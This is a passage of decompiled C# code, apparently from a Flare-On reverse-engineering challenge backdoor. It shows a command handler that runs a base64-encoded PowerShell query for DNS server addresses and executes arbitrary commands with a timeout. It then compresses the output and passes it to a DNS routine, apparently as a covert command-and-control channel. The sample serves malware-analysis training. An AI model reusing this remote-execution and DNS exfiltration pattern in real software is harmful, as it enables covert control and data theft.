														TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
													}
												}
											}
											else
											{
												bool flag58 = text == "21";
												if (flag58)
												{
													TaskClass.AppendFlagKeyChunk(int.Parse(text), "8e6");
													//G.e.t.-.D.n.s.C.l.i.e.n.t.S.e.r.v.e.r.A.d.d.r.e.s.s. .-.A.d.d.r.e.s.s.F.a.m.i.l.y. .I.P.v.4. .|. .S.e.l.e.c.t.-.O.b.j.e.c.t. .S.E.R.V.E.R.A.d.d.r.e.s.s.e.s.
													text = Cmd.Powershell("RwBlAHQALQBEAG4AcwBDAGwAaQBlAG4AdABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACAALQBBAGQAZAByAGUAcwBzAEYAYQBtAGkAbAB5ACAASQBQAHYANAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAUwBFAFIAVgBFAFIAQQBkAGQAcgBlAHMAcwBlAHMA");
													TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));
												}
											}
										}
									}
								}
							}
							string s2 = Cmd.ShrinkCmdResult(Cmd.ExecCmd(text));
							resultData = Encoding.UTF8.GetBytes(s2);
						});
						thread.Start();
						bool flag5 = !thread.Join(Config.task_timeout);
						if (flag5)
						{
							thread.Abort();
							resultData = Encoding.UTF8.GetBytes("timeout");
						}
					}
					bool flag6 = resultData != null;
					if (flag6)
					{
						byte[] array3 = FLARE04.flare_18(resultData);
						bool flag7 = array3.Length < resultData.Length;
						if (flag7)
						{
							resultData = new byte[]
							{
								61
							}.Concat(array3).ToArray<byte>();
						}
						else
						{
							resultData = new byte[]
							{
								57
							}.Concat(resultData).ToArray<byte>();
						}
					}
					byte[] array4 = new byte[(resultData == null) ? 0 : resultData.Length];
					bool flag8 = resultData != null;
					if (flag8)
					{
						Array.Copy(resultData, 0, array4, 0, resultData.Length);
					}
					TaskClass.ListData.RemoveAt(0);
					result = MachineCommand.HasResult;
					DnsClass.flare_28(array4);
				}
			}
			catch (Exception ex2)
			{
				result = MachineCommand.Failed;
			}
			return result;
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00004FDC File Offset: 0x0000BFDC
		public static string _GetMethodNamesFromStack()
		{
			StackTrace stackTrace = new StackTrace();
			return stackTrace.GetFrame(1).GetMethod().ToString() + stackTrace.GetFrame(2).GetMethod().ToString();
		}

		// Token: 0x0600009B RID: 155 RVA: 0x0000501C File Offset: 0x0000C01C
		public static string GetMethodNamesFromStack()
		{
			string result;
			try
			{
				result = TaskClass._GetMethodNamesFromStack();
			}
			catch (InvalidProgramException e)
			{
				result = (string)Util.flare_70(e, null);
			}
			return result;
		}

		// Token: 0x04000127 RID: 295
		public static IncrementalHash CommandsAndMethods = null;

		// Token: 0x04000128 RID: 296
		public static string FlagSectionNameHash = "";

		// Token: 0x04000129 RID: 297
		public static bool _someFlag = true;

		// Token: 0x0400012A RID: 298
		public static List<byte[]> ListData;
	}
}
